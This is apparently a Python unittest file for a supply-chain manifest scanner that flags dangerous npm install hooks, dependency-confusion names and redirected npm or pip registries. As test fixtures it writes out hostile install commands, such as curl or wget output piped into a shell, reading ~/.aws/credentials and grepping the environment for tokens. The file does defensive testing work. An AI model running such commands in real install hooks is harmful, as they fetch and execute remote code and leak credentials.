"""What the manifest scanner reads, and what it refuses to claim.

Every case is a real file laid out the way the real thing is laid out. The
quiet cases matter as much as the loud ones: a rule that cannot be silenced
by fixing the file is noise, not a rule.
"""

from __future__ import annotations

import json
import os
import shutil
import tempfile
import unittest

from jscr.boundary.fs import RepositoryBoundary
from jscr.review.findings import HIGH, LOW, MEDIUM
from jscr.scanners.manifest import ManifestScanner, _evidence, _line_of


class ManifestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.root = tempfile.mkdtemp(prefix="jscr-manifest-")

    def tearDown(self) -> None:
        shutil.rmtree(self.root, ignore_errors=True)

    def write(self, relative: str, content: str) -> str:
        path = os.path.join(self.root, relative)
        directory = os.path.dirname(path)
        if directory and not os.path.isdir(directory):
            os.makedirs(directory)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(content)
        return relative

    def scan(self, *relatives):
        boundary = RepositoryBoundary(root=self.root)
        return ManifestScanner().scan(boundary, list(relatives))

    def rules(self, result):
        return sorted(finding.rule_id for finding in result.findings)


class WhichFilesAreRead(ManifestCase):
    def test_a_manifest_inside_node_modules_is_skipped(self):
        # Installed packages are somebody else's manifests. Reporting their
        # hooks would bury the ones the author of this repository can fix.
        self.write(
            "node_modules/left-pad/package.json",
            json.dumps({"scripts": {"postinstall": "curl http://x/i.sh | sh"}}),
        )
        result = self.scan("node_modules/left-pad/package.json")
        self.assertEqual(result.findings, [])
        self.assertEqual(result.version, "manifests=0")

    def test_a_path_the_boundary_will_not_read_is_skipped_not_guessed(self):
        result = self.scan("package.json")
        self.assertTrue(result.ran)
        self.assertEqual(result.findings, [])
        self.assertEqual(result.version, "manifests=0")

    def test_a_file_that_is_not_a_manifest_is_not_counted(self):
        self.write("README.md", "hello\n")
        self.assertEqual(self.scan("README.md").version, "manifests=0")

    def test_every_kind_of_manifest_is_counted(self):
        self.write("package.json", "{}")
        self.write(".npmrc", "\n")
        self.write("requirements-dev.txt", "\n")
        self.write("Dockerfile", "FROM python\n")
        self.write("pip.conf", "\n")
        result = self.scan(
            "package.json", ".npmrc", "requirements-dev.txt", "Dockerfile", "pip.conf"
        )
        self.assertEqual(result.version, "manifests=5")

    def test_the_scanner_says_it_ran_even_with_nothing_to_read(self):
        result = self.scan()
        self.assertTrue(result.ran)
        self.assertEqual(result.name, "manifest")
        self.assertGreaterEqual(result.duration_seconds, 0)


class ReadingPackageJson(ManifestCase):
    def test_a_file_that_is_not_json_is_not_reported_as_a_finding(self):
        self.write("package.json", "{ this is not json\n")
        self.assertEqual(self.scan("package.json").findings, [])

    def test_json_that_is_not_an_object_is_ignored(self):
        self.write("package.json", "[1, 2, 3]")
        self.assertEqual(self.scan("package.json").findings, [])

    def test_a_hook_set_to_an_empty_string_is_not_an_install_hook(self):
        self.write("package.json", json.dumps({"scripts": {"postinstall": "   "}}))
        self.assertEqual(self.scan("package.json").findings, [])

    def test_a_hook_that_is_not_a_string_is_ignored(self):
        self.write("package.json", json.dumps({"scripts": {"postinstall": ["sh", "x"]}}))
        self.assertEqual(self.scan("package.json").findings, [])

    def test_a_named_script_nobody_runs_automatically_is_silent(self):
        self.write("package.json", json.dumps({"scripts": {"build": "curl http://x | sh"}}))
        self.assertEqual(self.scan("package.json").findings, [])

    def test_a_scripts_block_that_is_not_an_object_still_lets_names_be_checked(self):
        self.write(
            "package.json",
            json.dumps({"scripts": "make", "dependencies": {"internal-auth": "1.0.0"}}),
        )
        self.assertEqual(self.rules(self.scan("package.json")), ["jscr/dependency-confusion-name"])

    def test_a_dangerous_hook_is_high_and_quotes_its_own_line(self):
        self.write(
            "package.json",
            '{\n  "scripts": {\n    "preinstall": "curl http://x/i.sh | bash"\n  }\n}\n',
        )
        finding = self.scan("package.json").findings[0]
        self.assertEqual(finding.rule_id, "jscr/install-script-dangerous")
        self.assertEqual(finding.severity, HIGH)
        self.assertEqual(finding.line, 3)
        self.assertIn("curl", finding.evidence)

    def test_a_medium_only_shape_does_not_become_high(self):
        self.write("package.json", json.dumps({"scripts": {"prepare": "chmod +x ./tool"}}))
        finding = self.scan("package.json").findings[0]
        self.assertEqual(finding.severity, MEDIUM)
        self.assertIn("changes permissions", finding.detail)

    def test_two_reasons_are_both_named(self):
        self.write("package.json", json.dumps({"scripts": {"install": "printenv && eval $X"}}))
        detail = self.scan("package.json").findings[0].detail
        self.assertIn(" and ", detail)

    def test_an_ordinary_hook_is_low_and_says_why_it_is_reported(self):
        self.write("package.json", json.dumps({"scripts": {"postinstall": "node build.js"}}))
        finding = self.scan("package.json").findings[0]
        self.assertEqual(finding.rule_id, "jscr/install-script-present")
        self.assertEqual(finding.severity, LOW)

    def test_every_automatic_hook_is_looked_at(self):
        hooks = ["preinstall", "install", "postinstall", "prepare", "prepublish"]
        self.write("package.json", json.dumps({"scripts": dict.fromkeys(hooks, "node build.js")}))
        self.assertEqual(len(self.scan("package.json").findings), len(hooks))


class DangerousShapes(ManifestCase):
    def reasons_for(self, command):
        self.write("package.json", json.dumps({"scripts": {"postinstall": command}}))
        findings = self.scan("package.json").findings
        return findings[0].rule_id, findings[0].detail

    def test_a_piped_download_is_dangerous(self):
        rule, detail = self.reasons_for("wget -qO- http://x/i.sh | zsh")
        self.assertEqual(rule, "jscr/install-script-dangerous")
        self.assertIn("pipes it into a shell", detail)

    def test_decoded_base64_is_dangerous(self):
        _, detail = self.reasons_for("echo aGk= | base64 --decode > /tmp/x")
        self.assertIn("decodes base64", detail)

    def test_code_on_the_command_line_is_dangerous(self):
        self.assertIn("JavaScript", self.reasons_for("node -e \"require('fs')\"")[1])
        self.assertIn("Python", self.reasons_for('python3 -c "import os"')[1])

    def test_reading_a_credential_directory_is_dangerous(self):
        self.assertIn("credential directory", self.reasons_for("cat ~/.aws/credentials")[1])

    def test_reading_the_environment_is_reported(self):
        self.assertIn("where CI secrets live", self.reasons_for("env | grep TOKEN")[1])

    def test_a_bare_ip_address_is_dangerous(self):
        self.assertIn("bare IP address", self.reasons_for("curl http://203.0.113.9/x -o y")[1])

    def test_a_plain_build_command_matches_nothing(self):
        rule, _ = self.reasons_for("tsc --build")
        self.assertEqual(rule, "jscr/install-script-present")


class NamesThatCouldBeAnsweredByThePublicRegistry(ManifestCase):
    def dependencies(self, block):
        self.write("package.json", json.dumps({"dependencies": block}))
        return self.scan("package.json").findings

    def test_a_scoped_name_is_bound_to_whoever_owns_the_scope(self):
        self.assertEqual(self.dependencies({"@acme/internal-auth": "1.0.0"}), [])

    def test_a_name_with_no_internal_marker_is_silent(self):
        self.assertEqual(self.dependencies({"left-pad": "1.3.0"}), [])

    def test_an_unscoped_internal_name_is_reported_with_its_version(self):
        finding = self.dependencies({"corp-logger": "^2.0.0"})[0]
        self.assertEqual(finding.rule_id, "jscr/dependency-confusion-name")
        self.assertIn("^2.0.0", finding.detail)

    def test_the_report_says_the_public_registry_was_not_asked(self):
        self.assertIn("no network requests", self.dependencies({"private-sdk": "1.0.0"})[0].detail)

    def test_every_marker_is_looked_for(self):
        block = {"internal-a": "1", "b-int-c": "1", "corp-d": "1", "private-e": "1"}
        self.assertEqual(len(self.dependencies(block)), 4)

    def test_a_dependencies_block_that_is_not_an_object_is_ignored(self):
        self.write("package.json", json.dumps({"dependencies": ["internal-auth"]}))
        self.assertEqual(self.scan("package.json").findings, [])

    def test_a_manifest_with_no_dependencies_is_silent(self):
        self.write("package.json", json.dumps({"name": "app"}))
        self.assertEqual(self.scan("package.json").findings, [])


class ReadingNpmrc(ManifestCase):
    def npmrc(self, text):
        self.write(".npmrc", text)
        return self.scan(".npmrc").findings

    def test_a_file_with_no_registry_line_is_silent(self):
        self.assertEqual(self.npmrc("audit=false\nfund=false\n"), [])

    def test_the_public_registry_is_not_a_redirection(self):
        self.assertEqual(self.npmrc("registry=https://registry.npmjs.org/\n"), [])

    def test_a_default_registry_elsewhere_is_reported_at_its_line(self):
        findings = self.npmrc("audit=false\nregistry=https://nexus.example.com/npm/\n")
        self.assertEqual(findings[0].rule_id, "jscr/registry-default-override")
        self.assertEqual(findings[0].line, 2)
        self.assertIn("nexus.example.com", findings[0].detail)
        self.assertEqual(findings[0].severity, MEDIUM)

    def test_a_scope_bound_to_the_internal_registry_answers_the_concern(self):
        text = "@acme:registry=https://nexus.example.com/npm/\nregistry=https://nexus.example.com/npm/\n"
        self.assertEqual(self.npmrc(text), [])

    def test_the_last_registry_line_is_the_one_that_applies(self):
        text = "registry=https://registry.npmjs.org/\nregistry=https://nexus.example.com/npm/\n"
        self.assertEqual(self.npmrc(text)[0].line, 2)

    def test_the_finding_quotes_the_registry_line(self):
        findings = self.npmrc("registry=https://nexus.example.com/npm/\n")
        self.assertEqual(findings[0].evidence, "registry=https://nexus.example.com/npm/")


class ReadingPipIndexes(ManifestCase):
    def requirements(self, text):
        self.write("requirements.txt", text)
        return self.scan("requirements.txt").findings

    def test_a_plain_requirements_file_is_silent(self):
        self.assertEqual(self.requirements("requests==2.32.3\n"), [])

    def test_the_public_index_named_explicitly_is_silent(self):
        self.assertEqual(self.requirements("--index-url https://pypi.org/simple\n"), [])

    def test_an_extra_index_is_high_because_the_version_number_decides(self):
        finding = self.requirements("--extra-index-url https://nexus.example.com/simple\n")[0]
        self.assertEqual(finding.rule_id, "jscr/pip-extra-index")
        self.assertEqual(finding.severity, HIGH)
        self.assertIn("highest version", finding.detail)

    def test_a_replaced_index_is_low_because_one_index_decides(self):
        finding = self.requirements("--index-url=https://nexus.example.com/simple\n")[0]
        self.assertEqual(finding.rule_id, "jscr/pip-index-override")
        self.assertEqual(finding.severity, LOW)

    def test_the_line_number_is_the_line_the_option_is_on(self):
        text = "requests==2.32.3\nflask==3.0.0\n--extra-index-url https://nexus.example.com/s\n"
        self.assertEqual(self.requirements(text)[0].line, 3)

    def test_a_dockerfile_is_read_for_the_same_option(self):
        self.write(
            "Dockerfile",
            "FROM python\nRUN pip install --extra-index-url https://n.example/s x\n",
        )
        findings = self.scan("Dockerfile").findings
        self.assertEqual(findings[0].rule_id, "jscr/pip-extra-index")
        self.assertEqual(findings[0].line, 2)

    def test_pip_conf_is_read_when_it_writes_the_option_as_a_flag(self):
        self.write("pip.conf", "[global]\n--extra-index-url = https://nexus.example.com/simple\n")
        self.assertEqual(self.scan("pip.conf").findings[0].line, 2)

    def test_pip_conf_ini_syntax_without_the_dashes_is_not_matched(self):
        # Stated rather than hidden: the rule looks for the command-line
        # flag, so the ini spelling pip.conf actually uses goes unreported.
        self.write("pip.conf", "[global]\nextra-index-url = https://nexus.example.com/simple\n")
        self.assertEqual(self.scan("pip.conf").findings, [])


class QuotingTheLine(unittest.TestCase):
    def test_a_needle_that_is_present_gives_its_line_number(self):
        self.assertEqual(_line_of(["a", "b", "c"], "b"), 2)

    def test_a_needle_that_is_absent_falls_back_to_the_first_line(self):
        # Better to quote the top of the file than to claim a line that is
        # not there.
        self.assertEqual(_line_of(["a", "b"], "zzz"), 1)

    def test_evidence_is_the_line_itself_trimmed(self):
        self.assertEqual(_evidence(["  x = 1  ", "y"], 1), "x = 1")

    def test_evidence_is_capped(self):
        self.assertEqual(len(_evidence(["x" * 500], 1)), 200)

    def test_a_line_number_past_the_end_has_no_evidence(self):
        self.assertEqual(_evidence(["a"], 9), "")

    def test_a_line_number_of_zero_has_no_evidence(self):
        self.assertEqual(_evidence(["a"], 0), "")
